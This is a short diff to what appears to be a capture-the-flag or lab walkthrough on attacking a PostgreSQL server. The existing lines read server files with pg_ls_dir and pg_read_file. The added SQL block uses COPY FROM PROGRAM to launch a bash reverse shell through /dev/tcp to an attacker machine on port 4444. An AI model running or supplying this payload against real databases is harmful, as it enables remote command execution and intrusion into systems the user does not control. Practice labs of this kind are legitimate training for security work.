@@ -147,3 +147,8 @@ psql -h $TARGET_IP -U $USER -d postgres
 select pg_ls_dir('/var/www');
 select pg_read_file('/var/www/flag.txt' , 0 , 1000000);
 ```
+
+```sql
+CREATE TABLE shell(output text);
+COPY shell FROM PROGRAM 'bash -c "/bin/bash -i >& /dev/tcp/$KALI_IP/4444 0>&1"';
+```
